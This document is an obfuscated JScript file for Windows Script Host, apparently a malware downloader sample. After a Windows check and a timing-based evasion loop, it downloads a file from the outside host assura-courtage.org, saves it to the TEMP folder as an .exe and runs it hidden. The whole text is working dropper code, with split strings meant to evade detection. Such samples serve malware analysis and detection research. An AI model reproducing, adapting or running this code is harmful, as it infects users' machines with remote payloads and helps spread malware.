var _H = false;
var _Q0 = "CreateObject";
var _V = function _SD() {return WScript[_Q0]("WScript"+".Shell");}(), _VM = 11;
var _E = "MSXML2.XMLHTTP";
var _MY = 2123213;
var _MU = 0;
function _C(_SQ){_V["Run"](_SQ, _MU, _MU);};
function _J(){return _E + "";};
function _G(_N, _O0){_MU = _MU * 1; return _N - _O0;};
function _CY(){return _Q0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _H = true;
  @end
@*/
if (_H)
{
var _Q = "";
function _DW(){return 22;};
var _T = 0; var _CL = 0;
function _TW()
{
var _LN = new this["Date"]();
var _I = _LN["getUTCMilliseconds"]();
WScript["Sleep"](_DW());
var _LN = new this["Date"]();
var _JI = _LN["getUTCMilliseconds"]();
WScript["Sleep"](_DW());
var _LN = new this["Date"]();
var _F = _LN["getUTCMilliseconds"]();
var _T = "_SD0";
_T = _G(_JI, _I);
var _CL = "_A1";
_CL = _G(_F, _JI);
_Q = "open";
return _G(_T, _CL);
}
var _B = false;
var _I0 = false;
for (var _HM = _MU; _HM < _DW() * 1; _HM++){if (_TW() != _MU){
_B = true; 
_CL = "31" + 11 * _T + _CL; 
_I0 = true; 
break;
}}
function _HH() {return ((_B == true) && (_B == _I0)) ? 1 : _MU;};
if (_B && _HH() && _I0){
function _MW() {return _V["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "X6Djm0maSXD0uo.ex" + "e";};
 _Y = _J();
 _YF = WScript[_Q0](_Y);
 var _A0 = 1;
 while (_A0){
try {
	if (_A0 == 1)
	{
		_YF[_Q]("GET", "http://assura-courtage.org/j2osla", false);
		_YF["send"]();
		_W = "Sleep";
	}
	WScript[_W](_DW() + 120); 
	if (_YF["readystate"] < 2 * 2) continue;
	_A0 = _MU;
	function _GD(_AR) {var _L = (1, 2, 3, 4, 5, _AR); return _L;};
	_O = WScript[_CY()]("ADODB.Stream");
	_Y = _O;
	_Y[_Q]();
	_Y["type"] = _GD(1);
	_Y["write"](_YF["ResponseBody"]);
	_O["position"] = _GD(_MU);
	_Y["Save" + "ToFile"](_MW(), 2);
	_O["cl"+"ose"]();
	_A = _MW();
	_C(_A);
} catch(_KH){};
}
}
}

